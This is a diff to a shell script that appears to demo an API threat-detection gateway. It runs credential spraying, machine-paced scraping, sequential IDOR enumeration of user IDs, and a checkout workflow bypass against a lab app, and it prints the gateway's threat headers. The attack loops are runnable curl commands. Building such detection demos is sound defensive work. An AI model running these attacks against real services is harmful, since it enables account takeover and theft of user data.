@@ -8,17 +8,16 @@
 # ==============================================================================
 
 MODE="${1:-gateway}"
-GATEWAY_HOST="${GATEWAY_HOST:-127.0.0.1}"
-DIRECT_HOST="${DIRECT_HOST:-127.0.0.1}"
+TARGET_IP="${2:-${GATEWAY_HOST:-192.168.64.1}}"
 
 if [ "$MODE" = "direct" ]; then
-  BASE_URL="http://${DIRECT_HOST}:8001"
+  BASE_URL="http://${TARGET_IP}:8001"
   echo "=========================================================="
   echo ">>> ATTACKING DIRECT TARGET APP (UNPROTECTED): $BASE_URL"
   echo ">>> Vulnerabilities will SUCCEED and bypass security."
   echo "=========================================================="
 else
-  BASE_URL="http://${GATEWAY_HOST}:8000/gateway"
+  BASE_URL="http://${TARGET_IP}:8000/gateway"
   echo "=========================================================="
   echo ">>> ATTACKING THROUGH API THREAT GATEWAY (PROTECTED): $BASE_URL"
   echo ">>> Behavioral Engine will DETECT, SCORE & BLOCK threats."
@@ -31,38 +30,41 @@ echo "[1] ATTACK: Credential Stuffing on /auth/login"
 echo "----------------------------------------------------------"
 echo "[*] Spraying passwords against 'admin' account..."
 for pwd in "pass1" "pass2" "pass3" "pass4" "pass5" "pass6" "pass7"; do
-  STATUS=$(curl -s -o /tmp/resp.json -w "%{http_code}" -X POST "$BASE_URL/auth/login" \
+  STATUS=$(curl -s -D /tmp/hdrs.txt -o /tmp/resp.json -w "%{http_code}" -X POST "$BASE_URL/auth/login" \
     -H "Content-Type: application/json" \
     -d "{\"username\": \"admin\", \"password\": \"$pwd\"}")
   
-  SCORE=$(curl -s -I -X POST "$BASE_URL/auth/login" \
-    -H "Content-Type: application/json" \
-    -d "{\"username\": \"admin\", \"password\": \"$pwd\"}" | grep -i "x-threat-score" | tr -d '\r')
+  SCORE=$(grep -i "x-threat-score:" /tmp/hdrs.txt | tr -d '\r')
+  CAT=$(grep -i "x-threat-category:" /tmp/hdrs.txt | tr -d '\r')
+  ACTION=$(grep -i "x-threat-action:" /tmp/hdrs.txt | tr -d '\r')
   
-  echo " -> Attempt with '$pwd': HTTP $STATUS | $SCORE"
-  if [ "$STATUS" = "429" ]; then
-    echo " [!] GATEWAY TRIGGERED SOFT-BLOCK (429 Too Many Requests)!"
+  echo " -> Attempt with '$pwd': HTTP $STATUS | $SCORE | $CAT | $ACTION"
+  if [ "$STATUS" = "429" ] || [ "$STATUS" = "403" ]; then
+    echo " [!] GATEWAY TRIGGERED ENFORCEMENT BLOCK (HTTP $STATUS)!"
     cat /tmp/resp.json
     echo ""
     break
   fi
-  sleep 0.1
+  sleep 0.15
 done
 
 echo ""
 echo "----------------------------------------------------------"
 echo "[2] ATTACK: Machine-Paced Content Scraping on /products"
 echo "----------------------------------------------------------"
-echo "[*] Sending machine-paced requests at exact 100ms intervals..."
-for i in {1..10}; do
-  STATUS=$(curl -s -o /tmp/resp.json -w "%{http_code}" "$BASE_URL/products")
-  SCORE=$(curl -s -I "$BASE_URL/products" | grep -i "x-threat-score" | tr -d '\r')
-  echo " -> Request $i: HTTP $STATUS | $SCORE"
+echo "[*] Sending machine-paced requests at exact 80ms intervals..."
+for i in {1..12}; do
+  STATUS=$(curl -s -D /tmp/hdrs.txt -o /tmp/resp.json -w "%{http_code}" "$BASE_URL/products")
+  SCORE=$(grep -i "x-threat-score:" /tmp/hdrs.txt | tr -d '\r')
+  CAT=$(grep -i "x-threat-category:" /tmp/hdrs.txt | tr -d '\r')
+  echo " -> Request $i: HTTP $STATUS | $SCORE | $CAT"
   if [ "$STATUS" = "429" ] || [ "$STATUS" = "403" ]; then
     echo " [!] GATEWAY DETECTED SCRAPER VIA TIMING ENTROPY!"
+    cat /tmp/resp.json
+    echo ""
     break
   fi
-  sleep 0.10
+  sleep 0.08
 done
 
 echo ""
@@ -71,16 +73,19 @@ echo "[3] ATTACK: Sequential IDOR & User Profile Enumeration"
 echo "----------------------------------------------------------"
 echo "[*] Walking /users/{1..7} to exfiltrate private accounts..."
 for uid in {1..7}; do
-  STATUS=$(curl -s -o /tmp/resp.json -w "%{http_code}" "$BASE_URL/users/$uid")
-  CAT=$(curl -s -I "$BASE_URL/users/$uid" | grep -i "x-threat-category" | tr -d '\r')
+  STATUS=$(curl -s -D /tmp/hdrs.txt -o /tmp/resp.json -w "%{http_code}" "$BASE_URL/users/$uid")
+  CAT=$(grep -i "x-threat-category:" /tmp/hdrs.txt | tr -d '\r')
+  SCORE=$(grep -i "x-threat-score:" /tmp/hdrs.txt | tr -d '\r')
   if [ "$STATUS" = "200" ]; then
-    DATA=$(head -c 40 /tmp/resp.json)
+    DATA=$(head -c 60 /tmp/resp.json)
     echo " -> ID $uid: HTTP 200 (Data Leaked: $DATA...) | $CAT"
   else
-    echo " -> ID $uid: HTTP $STATUS | $CAT"
+    echo " -> ID $uid: HTTP $STATUS | $CAT | $SCORE"
   fi
-  if [ "$STATUS" = "429" ]; then
+  if [ "$STATUS" = "429" ] || [ "$STATUS" = "403" ]; then
     echo " [!] GATEWAY DETECTED SEQUENTIAL IDENTIFIER ENUMERATION!"
+    cat /tmp/resp.json
+    echo ""
     break
   fi
   sleep 0.15
@@ -93,20 +98,18 @@ echo "----------------------------------------------------------"
 echo "[*] Step 1: Browse /products"
 curl -s -o /dev/null -w " -> HTTP %{http_code}\n" "$BASE_URL/products"
 echo "[*] Step 2: Directly execute /checkout without /cart/add!"
-STATUS=$(curl -s -o /tmp/resp.json -w "%{http_code}" -X POST "$BASE_URL/checkout" \
+STATUS=$(curl -s -D /tmp/hdrs.txt -o /tmp/resp.json -w "%{http_code}" -X POST "$BASE_URL/checkout" \
   -H "Content-Type: application/json" \
   -d '{"payment_method": "credit_card"}')
-CAT=$(curl -s -I -X POST "$BASE_URL/checkout" \
-  -H "Content-Type: application/json" \
-  -d '{"payment_method": "credit_card"}' | grep -i "x-threat-category" | tr -d '\r')
-ACTION=$(curl -s -I -X POST "$BASE_URL/checkout" \
-  -H "Content-Type: application/json" \
-  -d '{"payment_method": "credit_card"}' | grep -i "x-threat-action" | tr -d '\r')
-echo " -> Checkout Result: HTTP $STATUS | $CAT | $ACTION"
+CAT=$(grep -i "x-threat-category:" /tmp/hdrs.txt | tr -d '\r')
+ACTION=$(grep -i "x-threat-action:" /tmp/hdrs.txt | tr -d '\r')
+SCORE=$(grep -i "x-threat-score:" /tmp/hdrs.txt | tr -d '\r')
+echo " -> Checkout Result: HTTP $STATUS | $SCORE | $CAT | $ACTION"
 cat /tmp/resp.json
 echo ""
 
 echo ""
 echo "=========================================================="
-echo "Demonstration complete for mode: $MODE"
+echo "Demonstration complete for mode: $MODE against $TARGET_IP"
 echo "=========================================================="
+
